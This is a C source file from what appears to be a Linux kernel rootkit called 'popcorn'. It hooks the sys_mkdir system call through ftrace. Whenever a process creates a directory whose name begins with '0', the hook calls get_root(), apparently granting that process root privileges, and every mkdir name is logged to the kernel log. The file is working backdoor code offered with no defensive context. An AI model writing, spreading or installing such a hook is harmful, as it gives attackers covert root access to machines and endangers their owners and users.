#include "../headers/hooks.h"
#include "../headers/credentials.h"

#ifdef PTREGS_SYSCALL_STUBS

// Define popcorn mkdir function call, for "pt-regs" versions of the kernel
asmlinkage int pn_mkdir(const struct pt_regs *regs) {
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0) {
        printk(KERN_INFO "User trying to create directory with name: \"%s\".\n", dir_name);
        if (dir_name[0] == '0') {
            get_root();
        }
    }

    lx_mkdir(regs);
    return 0;
}

#else

// Define popcorn mkdir function call, for non-"pt-regs" versions of the kernel
asmlinkage int pn_mkdir(const char __user *pathname, umode_t mode) {
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0) {
        printk(KERN_INFO "User trying to create directory with name: \"%s\".\n", dir_name);
        if (dir_name[0] == '0') {
            get_root();
        }
    }

    lx_mkdir(pathname, mode);
    return 0;
}

#endif

// Define ftrace kernel hooks
static struct ftrace_hook kernel_hooks[] = {
    // Swap The sys_mkdir call from linux to popcorn method...
    HOOK("sys_mkdir", pn_mkdir, &lx_mkdir)

};